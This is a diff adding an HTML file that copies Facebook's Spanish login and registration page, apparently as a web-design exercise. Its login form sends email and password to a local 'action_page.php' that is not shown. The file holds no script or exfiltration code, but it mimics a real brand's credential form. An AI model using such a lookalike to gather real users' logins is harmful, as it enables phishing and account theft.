@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entrar o registrarse</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+   
+    <div id="header">
+       
+        <img src="logo.png" alt="Logo Facebook" width="170" height="34"></img>
+
+        <form action="action_page.php" method="post">
+           
+            <table>
+                <tr>
+                    <td>
+                    <label for="email">Correo electrónico o teléfono</label>
+                    </td>
+                    <td>
+                    <label for="pass">Contraseña</label>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <input type="email" name="email" id="email"/>
+                    </td>
+                    <td>
+                        <input type="password" name="pass" id="pass"/>
+                    </td>
+                    <td>
+                        <label id="botonlogin" for="entrar">
+                        <button type="submit">Entrar</button>
+                        </label>
+                    </td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td>
+                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar">¿Has olvidado los datos de la cuenta?</a>
+                    </td>
+                </tr>
+            </table>
+          
+        </form>
+
+    </div>
+
+    <div id="container">
+        <div id="contenido">
+            <div id ="info">
+
+                <h3>Facebook te ayuda a comunicarte y compartir<br> con las personas que forman parte de tu vida.</h3>
+
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/OBaVg52wtTZ.png" alt="Logo Facebook" width="537" height="195"></img>
+
+            </div>
+
+            <div id ="register"> 
+                
+                <h1>Registrarte</h1>
+                <h3>Es rápido y fácil.</h3>
+
+                <form action="action_page.php">
+                    
+                    <div id="formcorto">
+                        <input type="text" placeholder="Nombre" name="nombre" required>
+                        <input type="text" placeholder="Apellidos" name="apellidos" required>
+                    </div> 
+                    <div id="formlargo"> 
+                        <input type="text" placeholder="Número de móvil o correo electrónico" name="usuario" required>
+                        <input type="password" placeholder="Contraseña nueva" name="psw" required><br><br>
+                    </div> 
+                    <label for="fecha"><b>Fecha de nacimiento</b></label><br><br>
+                        <select name="dia">
+                            <option selected value="0">Día</option> 
+                            <option value="1">1</option> 
+                            <option value="2">2</option> 
+                            <option value="3">3</option>
+                            <option value="4">4</option> 
+                            <option value="5">5</option> 
+                            <option value="6">6</option>
+                            <option value="7">7</option> 
+                            <option value="8">8</option> 
+                            <option value="9">9</option>
+                            <option value="10">10</option> 
+                            <option value="11">11</option> 
+                            <option value="12">12</option>
+                            <option value="13">13</option> 
+                            <option value="14">14</option> 
+                            <option value="15">15</option>
+                            <option value="16">16</option> 
+                            <option value="17">17</option> 
+                            <option value="18">18</option>
+                            <option value="19">19</option> 
+                            <option value="20">20</option> 
+                            <option value="21">21</option>
+                            <option value="22">22</option> 
+                            <option value="23">23</option> 
+                            <option value="24">24</option>
+                            <option value="25">25</option>  
+                            <option value="26">26</option>  
+                            <option value="27">27</option>  
+                            <option value="28">28</option>  
+                            <option value="29">29</option>  
+                            <option value="30">30</option>  
+                            <option value="31">31</option>    
+                        </select>
+                        <select name="mes">
+                            <option selected value="0">Mes</option> 
+                            <option value="1">ene</option> 
+                            <option value="2">feb</option> 
+                            <option value="3">mar</option>
+                            <option value="4">abr</option> 
+                            <option value="5">may</option> 
+                            <option value="6">jun</option>
+                            <option value="7">jul</option> 
+                            <option value="8">ago</option> 
+                            <option value="9">sep</option>
+                            <option value="10">oct</option> 
+                            <option value="11">nov</option> 
+                            <option value="12">dic</option>
+                        </select>
+                        <select name="año">
+                            <option selected value="0">Año</option> 
+                            <option value="1">2002</option> 
+                            <option value="2">2001</option> 
+                            <option value="3">2000</option>
+                            <option value="4">1999</option> 
+                            <option value="5">1998</option> 
+                            <option value="6">1997</option>
+                            <option value="7">1996</option> 
+                            <option value="8">1995</option> 
+                            <option value="9">1994</option>
+                            <option value="10">1993</option> 
+                            <option value="11">1992</option> 
+                            <option value="12">1991</option>
+                        </select>
+                    
+                    <div id="sexo">
+                        <label for="sexo"><b>Sexo</b></label><br>
+                        <input type="radio" name="mujer" value="1">Mujer
+                        <input type="radio" name="hombre" value="2">Hombre
+                        <input type="radio" name="personalizado" value="3">Personalizado
+                    </div>
+
+                    <p id="parrafo">Al hacer clic en Registrarte, aceptas nuestras <a href="https://www.facebook.com/legal/terms/update">Condiciones</a>. Obtén más información sobre cómo recopilamos, usamos y compartimos tu información en la <a href="https://www.facebook.com/about/privacy/update">Política de datos</a>, así como el uso que hacemos de las cookies y tecnologías similares en nuestra <a href="https://www.facebook.com/policies/cookies/">Política de cookies</a>. Es posible que te enviemos notificaciones por SMS que podrás desactivar cuando quieras.</p>
+
+                    <button type="submit">Registrarte</button>
+
+                    <p id="pagina"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Crea una página</a> para un personaje público, un grupo de música o un negocio.</p>
+                    
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+
+        <div id="idiomas">
+            <ul>
+                <li>Español (España)</li>
+                <li><a href="https://ca-es.facebook.com/">Català</a></li>
+                <li><a href="https://www.facebook.com/">English (US)</a></li>
+                <li><a href="https://fr-fr.facebook.com/">Français (France)</a></li>
+                <li><a href="https://ro-ro.facebook.com/">Română</a></li>
+                <li><a href="https://it-it.facebook.com/">Italiano</a></li>
+                <li><a href="https://gl-es.facebook.com/">Galego</a></li>
+                <li><a href="https://de-de.facebook.com/">Deutsch</a></li>
+                <li><a href="https://pt-br.facebook.com/">Português (Brasil)</a></li>
+                <li><a href="https://ar-ar.facebook.com/">العربية</a></li>
+                <li><a href="https://hi-in.facebook.com/">हिन्दी</a></li>
+            </ul>
+        </div>
+        <div id="utilidades">
+            <ul>
+                <li><a href="https://www.facebook.com/r.php">Registrarte</a></li>
+                <li><a href="https://www.facebook.com/login/">Entrar</a></li>
+                <li><a href="https://www.messenger.com/">Messenger</a></li>
+                <li><a href="https://www.facebook.com/lite/">Facebook Lite</a></li>
+                <li><a href="https://www.facebook.com/watch/">Watch</a></li>
+                <li><a href="https://www.facebook.com/directory/people/">Personas</a></li>
+                <li><a href="https://www.facebook.com/directory/pages/">Páginas</a></li>
+                <li><a href="https://www.facebook.com/pages/category/">Categorías de páginas</a></li>
+                <li><a href="https://www.facebook.com/places/">Lugares</a></li>
+                <li><a href="https://www.facebook.com/games/">Juegos</a></li>
+                <li><a href="https://www.facebook.com/directory/places/">Lugares</a></li>
+                <li><a href="https://www.facebook.com/marketplace/">Marketplace</a></li>
+                <li><a href="https://www.facebook.com/directory/groups/">Grupos</a></li>
+                <li><a href="https://www.instagram.com/">Instagram</a></li>
+                <li><a href="https://www.facebook.com/local/lists/245019872666104/">Local</a></li>
+                <li><a href="https://www.facebook.com/biz/directory/">Recaudaciones de fondos</a></li>
+                <li><a href="https://www.facebook.com/biz/directory/">Servicios</a></li>
+                <li><a href="https://www.facebook.com/facebook">Información</a></li>
+                <li><a href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&extra_1=auto">Crear anuncio</a></li>
+                <li><a href="https://www.facebook.com/pages/create/?ref_type=site_footer">Crear página</a></li>
+                <li><a href="https://developers.facebook.com/?ref=pf">Desarrolladores</a></li>
+                <li><a href="https://www.facebook.com/careers/?ref=pf">Empleo</a></li>
+                <li><a href="https://www.facebook.com/privacy/explanation">Privacidad</a></li>
+                <li><a href="https://www.facebook.com/policies/cookies/">Cookies</a></li>
+                <li><a href="https://www.facebook.com/help/568137493302217">Gestión de anuncios</a></li>
+                <li><a href="https://www.facebook.com/policies?ref=pf">Condiciones</a></li>
+                <li><a href="https://www.facebook.com/help/?ref=pf">Ayuda</a></li>
+            </ul>
+        </div>
+
+        <p>Facebook &copy; 2020</p>
+    </footer>
+
+
+
+
+</body>
+</html>
